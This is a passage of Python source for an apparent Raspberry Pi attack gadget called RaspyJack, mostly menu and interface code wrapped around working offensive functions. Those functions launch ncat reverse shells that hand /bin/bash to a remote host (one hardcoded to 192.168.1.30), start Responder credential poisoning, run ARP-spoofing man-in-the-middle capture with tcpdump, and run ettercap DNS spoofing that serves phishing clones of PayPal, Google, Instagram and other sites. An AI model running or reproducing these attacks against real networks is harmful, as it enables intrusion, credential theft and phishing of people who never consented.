        elif output.endswith("/"):               # entrer dans un dossier
            if not path.endswith("/"):
                path += "/"
            path += output
            if not path.endswith("/"):
                path += "/"
        else:                                    # prévisualiser un fichier image
            if YNDialog("Open?", "Yes", "No", output[:10]):
                full_img = os.path.join(path, output)
                with Image.open(full_img) as img:
                    image.paste(img.resize((128, 128)))
                time.sleep(1)
                getButton()
                color.DrawBorder()
    m.which = m.which[:-1]





WAIT_TXT = "Scan in progess..."


def run_scan(label: str, nmap_args: list[str]):
    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.before_scan(label, nmap_args)
        except Exception:
            pass

    Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)

    # Get target network from best available interface
    interface = get_best_interface()
    ip_with_mask = get_nmap_target_network(interface)
    
    if not ip_with_mask:
        Dialog_info("Network Error\nNo interface available", wait=True)
        return

    ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"

    # Build nmap command with interface specification
    cmd = ["nmap"] + nmap_args + ["-oN", path]
    
    # Add interface-specific parameters for better results
    interface_ip = get_interface_ip(interface)
    if interface_ip:
        cmd.extend(["-S", interface_ip, "-e", interface])
    
    cmd.append(ip_with_mask)
    
    subprocess.run(cmd)
    subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])

    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.after_scan(label, nmap_args, path)
        except Exception:
            pass

    Dialog_info(f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
    time.sleep(2)


# ---------- main table Nmap arguments -----------------
SCANS = {
    "Quick Scan"            : ["-T5"],
    "Full Port Scan"        : ["-p-"],
    "Service Scan"          : ["-T5", "-sV"],
    "Vulnerability"         : ["-T5", "-sV", "--script", "vuln"],
    "Full Vulns"            : ["-p-", "-sV", "--script", "vuln"],
    "OS Scan"               : ["-T5", "-A"],
    "Intensive Scan"        : ["-O", "-p-", "--script", "vuln"],
    "Stealth SYN Scan"      : ["-sS", "-T4"],                        # Half-open scan, avoids full TCP handshake
    "UDP Scan"              : ["-sU", "-T4"],                        # Finds services that only speak UDP
    "Ping Sweep"            : ["-sn"],                               # Host discovery without port scanning
    "Top100 Scan"           : ["--top-ports", "100", "-T4"],         # Quick look at the most common ports
    "HTTP Enumeration"      : ["-p", "80,81,443,8080,8443", "-sV", "--script", "http-enum,http-title"],  # Fast web-focused recon
}


globals().update({
    f"scan_{k.lower().replace(' ', '_')}": partial(run_scan, k, v)
    for k, v in SCANS.items()
})



def defaut_Reverse():
    # Get best available interface and its IP
    interface = get_best_interface()
    
    try:
        default_ip_bytes = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'|cut -d'.' -f1-3", shell=True)
        default_ip = default_ip_bytes.decode('utf-8').strip()
        default_ip_parts = default_ip.split(".")
        default_ip_prefix = ".".join(default_ip_parts[:3])
        new_value = GetIpValue(default_ip_prefix)
        target_ip = f"{default_ip_prefix}.{new_value}"
        nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
        print(f"Reverse launched on {target_ip} via {interface}!!!!!")
        process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        Dialog_info(f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
        time.sleep(2)
    except Exception as e:
        Dialog_info(f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
        time.sleep(2)

def remote_Reverse():
    nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    status_bar.set_temp_status("(Remote shell)", ttl=5)

def responder_on():
    check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
    check_responder_process = os.popen(check_responder_command).read().strip()
    if check_responder_process:
        subprocess.check_call(check_responder_command, shell=True)
        Dialog_info(" Already running !!!!", wait=True)
        time.sleep(2)
    else:
        # Get best interface for Responder
        interface = get_responder_interface()
        os.system(f'python3 /root/Raspyjack/Responder/Responder.py -Q -I {interface} &')
        Dialog_info(f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
        time.sleep(2)

def responder_off():
    os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
    Dialog_info("   Responder \n     stopped !!", wait=True)
    time.sleep(2)


def get_default_gateway_ip():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

def get_local_network():
    default_gateway_ip = get_default_gateway_ip()
    ip_parts = default_gateway_ip.split('.')
    ip_parts[-1] = '0'
    return '.'.join(ip_parts) + '/24'

def Start_MITM():
    safe_kill("arpspoof", "tcpdump")
    Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)
    
    # Get best interface for MITM attack
    interface = get_mitm_interface()
    local_network = get_local_network()
    print(f"[*] Starting MITM attack on local network {local_network} via {interface}...")

# Scan hosts on the network
    print("[*] Scanning hosts on network...")
    cmd = f"arp-scan --localnet --quiet|grep -v 'Interface\|Starting\|packets\|Ending'"
    result = os.popen(cmd).readlines()

# Display IP and MAC addresses of hosts
    hosts = []
    for line in result:
        parts = line.split()
        if len(parts) == 2:
            hosts.append({'ip': parts[0], 'mac': parts[1]})
            print(f"[+] Host: {parts[0]} ({parts[1]})")

# Retrieve the gateway IP address
    gateway_ip = get_default_gateway_ip()
    print(f"[*] Default gateway IP: {gateway_ip}")

# If at least one host is found, launch the ARP MITM attack
    if len(hosts) > 1:
        print(f"[*] Launching ARP poisoning attack via {interface}...")
        for host in hosts:
            if host['ip'] != gateway_ip:
                subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, host['ip']])
                subprocess.Popen(["arpspoof", "-i", interface, "-t", host['ip'], gateway_ip])
        print("[*] ARP poisoning attack complete.")

# Start tcpdump capture to sniff network traffic
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
        print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
        tcpdump_process.stdout.close()
        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
        time.sleep(8)
    else:
        print("[-] No hosts found on network.")
        Dialog_info("  ERREUR\nAucun hote.. ", wait=True)
        time.sleep(2)

def Stop_MITM():
    safe_kill("arpspoof", "tcpdump")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    time.sleep(2)
    status_bar.set_temp_status("(MITM stopped)", ttl=5)
    Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
    time.sleep(2)


# Name of the currently spoofed site (used elsewhere in your code)
site_spoof = "wordpress"

def spoof_site(name: str):
    global site_spoof
    site_spoof = name

    Dialog_info(f"    Spoofing sur\n    {name} !!!", wait=True)
    time.sleep(2)

    subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
    time.sleep(1)

    webroot = f"/root/Raspyjack/DNSSpoof/sites/{name}"
    cmd = f"cd {webroot} && php -S 0.0.0.0:80"
    subprocess.Popen(cmd, shell=True)              # launch the built-in PHP

# Central list of sites to spoof: add/remove freely here
SITES = [
    "microsoft", "wordpress", "instagram", "google", "amazon", "apple",
    "twitter", "netflix", "spotify", "paypal", "linkedin", "snapchat",
    "pinterest", "yahoo", "steam", "adobe", "badoo", "icloud",
    "instafollowers", "ldlc", "origin", "playstation", "protonmail",
    "shopping", "wifi", "yandex",
]

site_spoof = "wordpress"
# Chemin du fichier etter.dns
ettercap_dns_file = "/etc/ettercap/etter.dns"


def Start_DNSSpoofing():
    # Get best interface for DNS spoofing
    interface = get_best_interface()
    
    # Get gateway and current IP automatically
    gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
    current_ip = get_dns_spoof_ip(interface)
    
    if not current_ip:
        Dialog_info("DNS Spoof Error\nNo IP available", wait=True)
        return

# Escape special characters in the IP address for the sed command
    escaped_ip = current_ip.replace(".", r"\.")

    # Use sed to modify IP addresses in etter.dns file
    sed_command = f"sed -i 's/[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+/{escaped_ip}/g' {ettercap_dns_file}"
    subprocess.run(sed_command, shell=True)

    print("------------------------------- ")
    print(f"Site : {site_spoof}")
    print(f"Interface: {interface}")
    print(f"IP: {current_ip}")
    print("------------------------------- ")
    print("dns domain spoofed : ")
    dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
    subprocess.run(dnsspoof_command, shell=True)
    print("------------------------------- ")

# Commands executed in the background
    website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
    ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
    time.sleep(2)

# Execution of background commands
    website_process = subprocess.Popen(website_command, shell=True)
    ettercap_process = subprocess.Popen(ettercap_command, shell=True)


def Stop_DNSSpoofing():
    # Terminer les processus website et ettercap
    subprocess.run("pkill -f 'php'", shell=True)
    subprocess.run("pkill -f 'ettercap'", shell=True)

    Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
    time.sleep(2)

# WiFi Management Functions
def launch_wifi_manager():
    """Launch the FAST WiFi interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)
        return
    
    Dialog_info("Loading FAST WiFi\nSwitcher...", wait=True)
    exec_payload("fast_wifi_switcher.py")

def show_interface_info():
    """Show detailed interface information."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import show_interface_info as show_info
        
        # Create a text display of interface info
        current_interface = get_best_interface()
        interface_ip = get_interface_ip(current_interface)
        
        info_lines = [
            f"Current: {current_interface}",
            f"IP: {interface_ip or 'None'}",
            "",
            "Press any key to exit"
        ]
        
        if current_interface.startswith('wlan'):
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(current_interface)
                if status["ssid"]:
                    info_lines.insert(2, f"SSID: {status['ssid']}")
            except:
                pass
        
        GetMenuString(info_lines)
        
    except Exception as e:
        Dialog_info(f"Interface Info Error\n{str(e)[:20]}", wait=True)

def switch_interface_menu():
    """Show interface switching menu with actual switching capability."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import (
            list_wifi_interfaces_with_status, 
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )
        
        # Get current interface
        current = get_current_raspyjack_interface()
        
        # Get WiFi interfaces with status
        wifi_interfaces = list_wifi_interfaces_with_status()
        
        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound!", wait=True)
            return
        
        # Create menu with interface status  
        interface_list = []
        for iface_info in wifi_interfaces:
            name = iface_info['name']
            current_mark = ">" if iface_info['current'] else " "
            conn_status = "UP" if iface_info['connected'] else "DOWN"
            ip = iface_info['ip'][:10] if iface_info['ip'] else "No IP"
            interface_list.append(f"{current_mark} {name} ({conn_status}) {ip}")
        
        interface_list.append("")
        interface_list.append("Select WiFi interface")
        
        selection = GetMenuString(interface_list)
        
        if selection and not selection.startswith("Select") and selection.strip() and not selection.startswith(" "):
            # Extract interface name from selection
            parts = selection.split()
            if len(parts) >= 2:
                selected_iface = parts[1]  # Get the wlan0/wlan1 part
                
                if selected_iface.startswith('wlan'):
                    Dialog_info(f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)
                    
                    # Actually perform the switch
                    success = set_raspyjack_interface(selected_iface)
                    
                    if success:
                        Dialog_info(f"✓ SUCCESS!\nRaspyJack now using\n{selected_iface}\nAll tools updated", wait=True)
                    else:
                        Dialog_info(f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)
        
    except Exception as e:
        Dialog_info(f"Switch Error\n{str(e)[:20]}", wait=True)

def show_routing_status():
    """Show current routing status."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import get_current_default_route
        
        current_route = get_current_default_route()
        current_interface = get_best_interface()
        
        if current_route:
            info_lines = [
                "Routing Status:",
                f"Default: {current_route.get('interface', 'unknown')}",
                f"Gateway: {current_route.get('gateway', 'unknown')}",
                f"RaspyJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]
        else:
            info_lines = [
                "Routing Status:",
                "No default route found",
                f"RaspyJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]
        
        GetMenuString(info_lines)
        
    except Exception as e:
        Dialog_info(f"Routing Error\n{str(e)[:20]}", wait=True)

def switch_to_wifi():
    """Switch system to use WiFi as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import get_available_interfaces, ensure_interface_default
        
        # Find WiFi interfaces
        interfaces = get_available_interfaces()
        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]
        
        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound", wait=True)
            return
        
        # Use first available WiFi interface
        wifi_iface = wifi_interfaces[0]
        Dialog_info(f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)
        
        success = ensure_interface_default(wifi_iface)
        
        if success:
            Dialog_info(f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
        else:
            Dialog_info(f"✗ Switch failed\nCheck WiFi connection", wait=True)
            
    except Exception as e:
        Dialog_info(f"WiFi Switch Error\n{str(e)[:20]}", wait=True)

def switch_to_ethernet():
    """Switch system to use Ethernet as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import ensure_interface_default
        
        Dialog_info("Switching to Ethernet\neth0\nPlease wait...", wait=True)
        
        success = ensure_interface_default("eth0")
        
        if success:
            Dialog_info("✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
        else:
            Dialog_info("✗ Switch failed\nCheck ethernet connection", wait=True)
            
    except Exception as e:
        Dialog_info(f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)

def launch_interface_switcher():
    """Launch the interface switcher payload."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
    
    Dialog_info("Loading Interface\nSwitcher...", wait=True)
    exec_payload("interface_switcher_payload.py")

def quick_wifi_toggle():
    """FAST toggle between wlan0 and wlan1 - immediate switching."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import (
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )
        
        current = get_current_raspyjack_interface()
        
        # Determine target interface immediately
        if current == 'wlan0':
            target = 'wlan1'
        elif current == 'wlan1':
            target = 'wlan0'
        else:
            # Default to wlan1 if not using either
            target = 'wlan1'
        
        Dialog_info(f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)
        
        # IMMEDIATE switch with force
        success = set_raspyjack_interface(target)
        
        if success:
            Dialog_info(f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
        else:
            Dialog_info(f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)
            
    except Exception as e:
        Dialog_info(f"Error: {str(e)[:20]}", wait=True)


def list_payloads():
    """
    Returns a sorted list of available payloads.
    This includes .py scripts and directories containing a payload.sh file.
    """
    payloads = []
    path = default.payload_path
    if not os.path.isdir(path):
        os.makedirs(path, exist_ok=True)
        return []

    for fname in os.listdir(path):
        full_path = os.path.join(path, fname)
        # Python payload script
        if fname.endswith(".py") and not fname.startswith("_") and os.path.isfile(full_path):
            payloads.append(fname)
        # Directory-based shell payload (must contain payload.sh)
        elif os.path.isdir(full_path) and 'payload.sh' in os.listdir(full_path):
            payloads.append(fname)
            
    return sorted(payloads)

# ---------------------------------------------------------------------------
# 1)  Helper – reset GPIO *and* re-initialise the LCD
# ---------------------------------------------------------------------------
def _setup_gpio() -> None:
    """
    Bring every pin back to a known state **after** a payload
    (which most likely called ``GPIO.cleanup()`` on exit) and create a *fresh*
    LCD driver instance so that the display can be used again.
    """
    # --- GPIO -------------------------------------------------------------
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():                     # all buttons back to inputs
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # --- LCD --------------------------------------------------------------
    global LCD, image, draw                      # replace the old objects
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (LCD.width, LCD.height), "BLACK")
    draw  = ImageDraw.Draw(image)


# ---------------------------------------------------------------------------
# 2)  exec_payload – run a script then *immediately* restore RaspyJack UI
# ---------------------------------------------------------------------------
def exec_payload(filename: str) -> None:
    """
    Execute a Python script or a shell payload directory located in « payloads/ »
    and *always* return control – screen **and** buttons – to RaspyJack.

    Workflow
    --------
    1. Freeze the UI (stop background threads, black screen).
    2. Run the payload **blocking** in the foreground.
       - For .py files: executed directly with the Python interpreter.
       - For directories: `payload_executor.py` is called with the path to `payload.sh`.
    3. Whatever happens, re-initialise GPIO + LCD and redraw the menu.
    """
    is_py_payload = filename.endswith('.py')
    is_dir_payload = not is_py_payload

    full_path = os.path.join(default.payload_path, filename)

    # --- Validate payload existence ---
    if is_py_payload and not os.path.isfile(full_path):
        Dialog_info(f"Payload script not found:\n{filename}", wait=True)
        return
    elif is_dir_payload and not (os.path.isdir(full_path) and 'payload.sh' in os.listdir(full_path)):
        Dialog_info(f"Payload directory not found\nor missing payload.sh:\n{filename}", wait=True)
        return

    print(f"[PAYLOAD] ► Starting: {filename}")
    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.before_exec_payload(filename)
        except Exception:
            pass
    screen_lock.set()                # stop _stats_loop & _display_loop
    LCD.LCD_Clear()                  # give the payload a clean canvas

    log = open(default.payload_log, "ab", buffering=0)
    try:
        command = []
        if is_py_payload:
            # Execute Python payload directly
            command = [sys.executable, "-u", full_path]
        else:
            # For directory payloads, use the orchestrator
            executor_script = os.path.join(default.payload_path, "payload_executor.py")
            shell_script_path = os.path.join(full_path, "payload.sh")
            command = [sys.executable, "-u", executor_script, shell_script_path]

        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=default.install_path,
            text=True,
            bufsize=1
        )

        # Stream output to both service log (print) and payload log file
        if proc.stdout:
            for line in iter(proc.stdout.readline, ''):
                print(line, end='')  # Print to RaspyJack's main log
                log.write(line.encode('utf-8'))  # Write to payload.log

        proc.wait()
    except Exception as exc:
        print(f"[PAYLOAD] E: {exc}")
    finally:
        log.close()

    # ---- restore RaspyJack ----------------------------------------------
    print("[PAYLOAD] ◄ Restoring LCD & GPIO…")
    _setup_gpio()                                  # SPI/DC/RST/CS back

    # rebuild the current menu image
    color.DrawMenuBackground()
    color.DrawBorder()
    ShowLines(m.GetMenuList())                     # text + cursor
    LCD.LCD_ShowImage(image, 0, 0)                 # push *before* unlock

    # small debounce: 300 ms max
    t0 = time.time()
    while any(GPIO.input(p) == 0 for p in PINS.values()) and time.time() - t0 < .3:
        time.sleep(.03)

    screen_lock.clear()                            # threads can run again
    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.after_exec_payload(filename, True)
        except Exception:
            pass
    print("[PAYLOAD] ✔ Menu ready – you can navigate again.")


### Menu class ###
class DisposableMenu:
    which  = "a"     # Start menu
    select = 0       # Current selection index
    char   = "> "    # Indentation character
    max_len = 17     # Max chars per line
    view_mode = "list"  # "list", "grid", or "carousel" - current view mode

    menu = {
        "a": (
            [" Scan Nmap",      "ab"],     # b
            [" Reverse Shell",  "ac"],     # c
            [" Responder",      "ad"],     # d
            [" MITM & Sniff",   "ai"],     # i
            [" DNS Spoofing",   "aj"],     # j
            [" Network info",   ShowInfo], # appel direct
            [" WiFi Manager",   "aw"],     # w
            [" Other features", "ag"],     # g
            [" Read file",      "ah"],     # h
            [" Payload", "ap"],            # p
            [" Plugins",        "al"],     # l
        ),

        "ab": tuple(
            [f" {name}", partial(run_scan, name, args)]
            for name, args in SCANS.items()
        ),

        "ac": (
            [" Defaut Reverse",  defaut_Reverse],
            [" Remote Reverse",  remote_Reverse]
        ),

        "ad": (
            [" Responder ON",   responder_on],
            [" Responder OFF",  responder_off]
        ),
        "ag": (
            [" Browse Images", ImageExplorer],
            [" Options",       "ae"],   # e
            [" System",        "af"]    # f
        ),

        "ae": (
            [" Colors",         "aea"],
            [" Refresh config", LoadConfig],
            [" Save config!",   SaveConfig]
        ),

        "aea": (
            [" Background",          [SetColor, 0]],
            [" Text",                [SetColor, 2]],
            [" Selected text",       [SetColor, 3]],
            [" Selected background", [SetColor, 4]],
            [" Border",              [SetColor, 1]],
            [" Gamepad border",      [SetColor, 5]],
            [" Gamepad fill",        [SetColor, 6]]
        ),

        "af": (
            [" Shutdown system", [Leave, True]],
            [" Restart UI",      Restart]
        ),

        "ah": (
            [" Nmap",      ReadTextFileNmap],
            [" Responder", ReadTextFileResponder],
            [" DNSSpoof",  ReadTextFileDNSSpoof]
        ),

        "ai": (
            [" Start MITM & Sniff", Start_MITM],
            [" Stop MITM & Sniff",  Stop_MITM]
        ),

        "aj": (
            [" Start DNSSpoofing",  Start_DNSSpoofing],
            [" Select site",        "ak"],
            [" Stop DNS&PHP",       Stop_DNSSpoofing]
        ),

        "ak": tuple(
            [f" {site}", partial(spoof_site, site)]
            for site in SITES
        ),

        "aw": (
            [" FAST WiFi Switcher", launch_wifi_manager],
            [" INSTANT Toggle 0↔1", quick_wifi_toggle],
            [" Switch Interface", switch_interface_menu],
            [" Show Interface Info", show_interface_info],  
            [" Route Control", "awr"],
        ) if WIFI_AVAILABLE else (
            [" WiFi Not Available", lambda: Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)],
        ),

        "awr": (
            [" Show Routing Status", show_routing_status],
            [" Switch to WiFi", switch_to_wifi],
            [" Switch to Ethernet", switch_to_ethernet],
            [" Interface Switcher", launch_interface_switcher]
        ),
    }

    # -----------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------
    def GetMenuList(self):
        """Return only the labels of the current menu."""
        return [item[0] for item in self.menu[self.which]]

    def GetMenuIndex(self, inlist):
        """Return the index of the selected label, or -1 if none."""
        x = GetMenuString(inlist)
        if x:
            for i, (label, _) in enumerate(self.menu[self.which]):
                if label == x:
                    return i
        return -1
    # Génération à chaud du sous-menu Payload -------------------------------
    def _build_payload_menu(self):
        """Create (or refresh) the 'ap' payload submenu from the filesystem contents."""

        def _label_for(entry: str) -> str:
            # If it's a .py script remove only the extension; keep directory names as-is
            name, ext = os.path.splitext(entry)
            return name if ext == '.py' else entry
        payload_entries = []
        for script in list_payloads():
            label = _label_for(script)
            payload_entries.append([f" {label}", partial(exec_payload, script)])
        self.menu["ap"] = tuple(payload_entries) or ([" <empty>", lambda: None],)

    def _build_plugins_menu(self):
        """Build dynamic plugins submenu 'al' with toggle entries plus a save+restart option."""
        cfg = load_plugins_conf()
        entries = []
        for name in sorted(cfg.keys()):
            # closure to toggle specific plugin
            def _make_toggle(pname):
                def _toggle():
                    c = load_plugins_conf()
                    if pname in c:
                        c[pname]['enabled'] = not bool(c[pname].get('enabled'))
                        save_plugins_conf(c)
                    # Rebuild to reflect new state (no restart yet)
                    self._build_plugins_menu()
                return _toggle
            entries.append([f" [{'x' if cfg[name].get('enabled') else ' '}] {name}", _make_toggle(name)])
        # Save & Restart item
        def _save_restart():
            Dialog_info(" Restarting UI\n  for plugins", wait=True)
            time.sleep(0.5)
            Restart()
        entries.append([" Save & Restart", _save_restart])
        self.menu["al"] = tuple(entries) if entries else ( [" <no plugins>", lambda: None], )

    def __init__(self):
        # cette fois, `default` est déjà instancié → pas d'erreur
        self._build_payload_menu()
        self._build_plugins_menu()


### Font Awesome Icon Mapping ###
MENU_ICONS = {
    " Scan Nmap": "\uf002",        # search
    " Reverse Shell": "\uf120",    # terminal  
    " Responder": "\uf505",        # responder (updated)
    " MITM & Sniff": "\uf6ff",     # MITM (updated)
    " DNS Spoofing": "\uf233",     # server
    " Network info": "\ue012",     # network info (updated)
    " WiFi Manager": "\uf1eb",     # wifi
    " Other features": "\uf085",   # cogs
    " Read file": "\uf15c",        # file-alt
    " Payload": "\uf121",          # code/terminal icon
    " Plugins": "\uf12e",          # puzzle-piece icon
}

### Menu Descriptions for Carousel View ###
MENU_DESCRIPTIONS = {
    " Scan Nmap": "Network discovery\nand port scanning\nwith Nmap",
    " Reverse Shell": "Establish reverse\nconnections for\nremote access",
    " Responder": "LLMNR, NBT-NS &\nMDNS poisoner\nfor credentials",
    " MITM & Sniff": "Man-in-the-middle\nattacks and traffic\ninterception",
    " DNS Spoofing": "Redirect DNS\nqueries to fake\nphishing sites",
    " Network info": "Display current\nnetwork interface\nand IP information",
    " WiFi Manager": "Manage wireless\nconnections and\ninterface switching",
    " Other features": "Additional tools\nand system\nconfiguration",
    " Read file": "View captured\ndata and scan\nresults",
    " Payload": "Execute custom\nPython scripts\nand tools",
    " Plugins": "Enable/disable\nUI overlay\nplugins",
}


def GetMenuCarousel(inlist, duplicates=False):
    """
    Display menu items in a carousel layout with huge icon in center and navigation arrows.
    - Carousel navigation: LEFT/RIGHT for main navigation
    - UP/DOWN for fine adjustment  
    - Shows huge icon in center with left/right arrows
    - Returns selected item or empty string
    """
    if not inlist:
        inlist = ["Nothing here :("]
    
    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]
    
    total = len(inlist)
    index = m.select if m.select < total else 0
    
    while True:
        # Draw carousel
        color.DrawMenuBackground()
        
        # Current item (center, large)
        current_item = inlist[index]
        txt = current_item if not duplicates else current_item.split('#', 1)[1]
        
        # Main item display area (center)
        main_x = 64  # Center of 128px screen
        main_y = 64  # Center vertically
        
        # Draw huge icon in center
        icon = MENU_ICONS.get(txt, "\uf192")  # Default to dot-circle icon
        # Large font for the icon
        huge_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', 48)
        draw.text((main_x, main_y - 12), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")
        
        # Draw menu item name under the icon with custom font for carousel view
        title = txt.strip()
        # Create a bigger, bolder font specifically for carousel view
        carousel_text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 12)
        draw.text((main_x, main_y + 28), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")
        
        # Draw navigation arrows - always show if there are multiple items
        if total > 1:
            arrow_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 18)
            # Left arrow (always show for wraparound)
            draw.text((20, main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
            # Right arrow (always show for wraparound)  
            draw.text((108, main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
        
        time.sleep(0.12)
        
        # Handle button input
        btn = getButton()
        if btn == "KEY_LEFT_PIN":
            # Wraparound navigation - go to last item if at first
            index = (index - 1) % total
        elif btn == "KEY_RIGHT_PIN":
            # Wraparound navigation - go to first item if at last
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            # Fine adjustment - same as left
            index = (index - 1) % total
        elif btn == "KEY_DOWN_PIN":
            # Fine adjustment - same as right  
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                m.select = index
                return inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
        elif btn == "KEY1_PIN":
            # Toggle to next view mode
            toggle_view_mode()
            return ""
        elif btn == "KEY3_PIN":
            return ""  # Go back


def GetMenuGrid(inlist, duplicates=False):
    """
    Display menu items in a grid layout (2 columns x 4 rows = 8 items visible).
    - Grid navigation: UP/DOWN/LEFT/RIGHT
    - Returns selected item or empty string
    """
    GRID_COLS = 2
    GRID_ROWS = 4
    GRID_ITEMS = GRID_COLS * GRID_ROWS
    
    if not inlist:
        inlist = ["Nothing here :("]
    
    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]
    
    total = len(inlist)
    index = m.select if m.select < total else 0
    
    while True:
        # Calculate grid window
        start_idx = (index // GRID_ITEMS) * GRID_ITEMS
        window = inlist[start_idx:start_idx + GRID_ITEMS]
        
        # Draw grid
        color.DrawMenuBackground()
        
        for i, item in enumerate(window):
            if i >= GRID_ITEMS:
                break
                
            # Calculate grid position
            row = i // GRID_COLS
            col = i % GRID_COLS
            
            # Grid item position
            x = default.start_text[0] + (col * 55)  # 55px per column
            y = default.start_text[1] + (row * 25)  # 25px per row
            
            # Check if this item is selected
            is_selected = (start_idx + i == index)
            
            if is_selected:
                # Draw selection rectangle
                draw.rectangle(
                    (x - 2, y - 2, x + 53, y + 23),
                    fill=color.select
                )
                fill_color = color.selected_text
            else:
                fill_color = color.text
            
            # Draw icon and text
            txt = item if not duplicates else item.split('#', 1)[1]
            icon = MENU_ICONS.get(txt, "")
            
            if icon:
                # Draw icon
                draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
                # Draw short text label
                short_text = txt.strip()[:8]  # Limit text length for grid
                draw.text((x, y + 13), short_text, font=text_font, fill=fill_color)
            else:
                # Draw text only
                short_text = txt.strip()[:10]
                draw.text((x, y + 8), short_text, font=text_font, fill=fill_color)
        
